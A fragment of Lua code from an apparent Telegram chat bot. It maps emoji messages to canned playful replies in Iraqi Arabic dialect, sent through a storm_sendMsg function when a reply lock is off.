if text =="😘😘😘😘" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• ﻋٰۧﻋٰ̯ۧـسۂﻝَُّ↵⁽̯⁾ֆ‘ يا • ﻋٰۧﻋٰ̯ۧـسۂﻝَُّ↵⁽🍯̯⁾ֆ‘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😘😘😘" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• ﻋٰۧﻋٰ̯ۧـسۂﻝَُّ↵⁽🍯̯⁾ֆ‘ يا • ﻋٰۧﻋٰ̯ۧـسۂﻝَُّ↵⁽̯⁾ֆ‘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😘😘" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• ﻋٰۧﻋٰ̯ۧـسۂﻝَُّ↵⁽🍯̯⁾ֆ‘ يا • ﻋٰۧﻋٰ̯ۧـسۂﻝَُّ↵⁽🍯̯⁾ֆ‘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😘" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• ﻋٰۧﻋٰ̯ۧـسۂﻝَُّ↵⁽🍯̯⁾ֆ‘ يا • ﻋٰۧﻋٰ̯ۧـسۂﻝَُّ↵⁽🍯̯⁾ֆ‘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="☺☺☺☺" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ابتسامه مال واحد شايل اهموم الدنيا كوله بگلبه 💔😿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="☺☺☺" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ابتسامه مال واحد شايل اهموم الدنيا كوله بگلبه 💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="☺☺" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ابتسامه مال واحد شايل اهموم الدنيا كوله بگلبه 💔😿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="☺" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ابتسامه مال واحد شايل اهموم الدنيا كوله بگلبه 💔😿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😞😞😞😞" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو مضوجك🙀 دليني عليه😾💪🏼"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😞😞😞" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو مضوجك دليني عليه😾💪🏼"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😞😞" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو مضوجك دليني عليه😾🏼"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😞" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو مضوجك🙀 دليني عليه😾💪🏼"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😻😻😻😻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "باع الحب صاعد عده فول 😹😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😻😻😻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "باع الحب صاعد عده فول 😹😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😻😻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "باع الحب صاعد عده فول 😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "باع الحب صاعد عده فول 😹😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😇" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مسويلك مصيبه ودا تبتسم 😻😹😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😇😇" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مسويلك مصيبه ودا تبتسم 😻😹😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منور يبعد الكلب 🌺😇"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🚶" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منور يبعد الكلب 🌺😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🚶🚶" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منور يبعد الكلب 🌺😻😇"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🚶🚶🚶" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منور يبعد الكلب 🌺😇"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😢😢😢😢" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عيــونك/ج✨ حرام ينزل دمعهن🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😢😢😢" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عيـ😻ـونك/ج✨ حرام ينزل😴 دمعهن🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😢😢" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عيـ😻ـونك/ج✨ حرام ينزل دمعهن🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😢" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عيـ😻ـونك/ج✨ حرام ينزل😴 دمعهن🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😹😹😹😹" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "دوم الضحكه يالغالي 😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😹😹😹" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "دوم الضحكه يالغالي "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😹😹" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "دوم الضحكه يالغالي 😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😹" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "دوم الضحكه يالغالي 😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😿😿😿😿" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو وياك يرويحتي 😓"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😿😿😿" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو وياك يرويحتي 😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😿😿" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو وياك يرويحتي 😓"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😿" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو وياك يرويحتي 😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😏😏😏😏" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عود شوفوني اني شخصـية 😣وهو وجـهه وجه الطلي 🙊😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😏😏😏" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عود شوفوني اني شخصـية وهو وجـهه وجه الطلي 🙊😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😏😏" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عود شوفوني اني شخصـية 😣وهو وجـهه وجه الطلي 🙊😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😏" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عود شوفوني اني شخصـية 😣وهو وجـهه وجه الطلي 😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😒😒😒😒" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبي🙃 ‎‏💛🙈  ggɺᓗɺÎ  ضايج"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😒😒😒" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبي ‎‏💛  ggɺᓗɺÎ  ضايج💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😒😒" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبي🙃 ‎‏💛  ggɺᓗɺÎ  ضايج"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😒" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبي ‎‏💛🙈  ggɺᓗɺÎ  ضايج"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😝😝😝😝" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لو جوعان 🤔لو مريض نفسي💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😝😝😝" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لو جوعان لو مريض نفسي💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😝😝" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لو جوعان 🤔لو مريض نفسي😹💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😝" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لو جوعان 🤔لو مريض نفسي😹💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😕😕😕" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شكو عاوج حلكك😒😻😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😕😕" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شكو عاوج حلكك😒😻😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😕" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شكو عاوج حلكك😒😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶‍♀️🚶‍♀️🚶‍♀️🚶‍♀️" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "- الجمال البـيـج فـاتح للـغغزل چم بـاب💅🏻💛"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶‍♀️🚶‍♀️🚶‍♀️" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "- الجمال البـيـج فـاتح للـغغزل چم بـاب💅🏻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶‍♀️🚶‍♀️" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "- الجمال البـيـج فـاتح للـغغزل چم بـاب🏻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶‍♀️" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "- الجمال البـيـج فـاتح للـغغزل چم بـاب💅🏻💛"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🏻🚶🏻🚶🏻🚶🏻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "- الجمال البـيـك فـاتح للـغغزل چم بـاب💛"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🏻🚶🏻🚶🏻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "- الجمال البـيـك فـاتح للـغغزل چم بـاب💛"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🏻🚶🏻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "- الجمال البـيـك فـاتح للـغغزل چم بـاب💛"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🏻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "- الجمال البـيـك فـاتح للـغغزل چم بـاب💛"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end 
if text =="😔😔😔😔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ليش زعلان يعمري 😔 تعال احجيلي اهمومك"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end 
if text =="😔😔😔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ليش زعلان يعمري 😔 تعال احجيلي اهمومك"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😔😔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ليش زعلان يعمري 😔 تعال احجيلي اهمومك💔🍃"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ليش زعلان يعمري 😔 تعال احجيلي اهمومك💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😑😑😑😑" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو مضوجك☹️ פـٍـٍبيبي ءّ‍♂️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😑😑😑" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو مضوجك☹️ פـٍـٍبيبي ءّ‍♂️💜"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😑😑" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو مضوجك☹️ פـٍـٍبيبي ءّ🙍‍♂️💜"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😑" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منو مضوجك☹️ פـٍـٍبيبي ءّ🙍‍♂️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😐😐😐😐" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبيك ضايج يروحي 😓😭"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😐😐😐" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبيك ضايج يروحي "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😐😐" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبيك ضايج يروحي 😓😭"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😐" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبيك ضايج يروحي 😓😭"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😋😋😋😋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لو جوعان 🤔لو مريض نفسي😹💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😋😋😋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لو جوعان لو مريض نفسي😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😋😋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لو جوعان 🤔لو مريض نفسي😹💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لو جوعان 🤔لو مريض نفسي💔"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😎😎😎😎" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مسوي عمليه لعيونك  لو انت خبل🙌"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😎😎😎" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مسوي عمليه لعيونك 😔 لو انت خبل🙌😿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😎😎" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مسوي عمليه لعيونك 😔 لو انت خبل🙌😿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😎" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "مسوي عمليه لعيونك 😔 لو انت خبل🙌😿"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😴😴😴😴" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "رأح, دكـّــوم تـّــمس๋͜‏ـلّـ๋͜‏ـت ولي نأم 😹☹️😻  "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😴😴😴"  and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "رأح, دكـّــوم تـّــمس๋͜‏ـلّـ๋͜‏ـت ولي نأم ☹️😻  "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😴😴" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "رأح, دكـّــوم تـّــمس๋͜‏ـلّـ๋͜‏ـت ولي نأم ☹️😻  "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😴" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "رأح, دكـّــوم تـّــمس๋͜‏ـلّـ๋͜‏ـت ولي نأم 😹☹️😻  "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😽😽😽😽" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   " ﭑإ́وُف فديـٍَــت ﭑإ́لـپـــٰٰـوُﮨﮨﮨــهٰ⇣̉ـ  😻🙈🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😽😽😽" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   " ﭑإ́وُف فديـٍَــت ﭑإ́لـپـــٰٰـوُﮨﮨﮨــهٰ⇣̉ـ  😻🙈🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😽😽" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   " ﭑإ́وُف فديـٍَــت ﭑإ́لـپـــٰٰـوُﮨﮨﮨــهٰ⇣̉ـ  😻🙈"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💋💋💋💋💋💋💋💋💋💋💋💋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   " ﭑإ́وُف فديـٍَــت ﭑإ́لـپـــٰٰـوُﮨﮨﮨــهٰ⇣̉ـ  🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😾😹" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "خاب ديلك😐😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😾" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "خاب ديلك"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ﭑإ́وُف ﭑإ́لـلــهٰ⇣̉ يـٍَﮩﮨﮨﮨـﭑإ́عـِِِِد قلـپـــٰٰـك 😢😞💋 "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💔💔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ﭑإ́وُف ﭑإ́لـلــهٰ⇣̉ يـٍَﮩﮨﮨﮨـﭑإ́عـِِِِد قلـپـــٰٰـك 😢😞💋 "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💔💔💔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ﭑإ́وُف ﭑإ́لـلــهٰ⇣̉ يـٍَﮩﮨﮨﮨـﭑإ́عـِِِِد قلـپـــٰٰـك 😢😞💋 "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💔💔💔💔" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ﭑإ́وُف ﭑإ́لـلــهٰ⇣̉ يـٍَﮩﮨﮨﮨـﭑإ́عـِِِِد قلـپـــٰٰـك 😢😞 "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="👄" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "قلبوشتي"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💙" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عافيتي💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💜" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يروحي😻انت"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="❤" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "يعمري😻 انت "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💚" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منور ابو كلب الاخضر😐😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💋💋💋💋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "اوووف شنو هذا الحلك😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💋💋💋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "اوووف شنو هذا الحلك😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💋💋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "اوووف شنو هذا الحلك😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "اوووف شنو هذا الحلك😻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "هلا حبعمري🙂❤️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙋🙋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "هلا حبعمري❤️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙋🙋" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "هلا حبعمري❤️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐕" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ها عمو شبيك🌝"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐆" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ولا يكعد راحه ابو صابر🌝😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐈" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "بشت بشت😐"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😘🌹" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "هلا حياتي عطرها💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🍀" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "هلا حياتي عطرها🙂💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🌝🌝🌝🌝" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شـﮫـۛالـٰٰ̲ضـِۛـوٰ୭ٰۛٳٲ  ۶"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🌝🌝🌝" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شـﮫـۛالـٰٰ̲ضـِۛـوٰ୭ٰۛٳٲ  ۶"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🌝🌝" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شـﮫـۛالـٰٰ̲ضـِۛـوٰ୭ٰۛٳٲ 🌝 ۶"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🌝" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شـﮫـۛالـٰٰ̲ضـِۛـوٰ୭ٰۛٳٲ 🌝💙 ۶"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐍" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ماكو غيرك زاحف🙊🗯"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐍🐍" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ماكو غيرك زاحف🙊🗯"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐍🐍🐍" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ماكو غيرك زاحف🙊🗯"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐍🐍🐍🐍" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "ماكو غيرك زاحف🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐅" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منور النجر🌝😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐅🐅" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "منور النجر🌝😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐅🐅🐅" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   " منورالنجر "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🐅" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عطرها حبي🌝💋"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
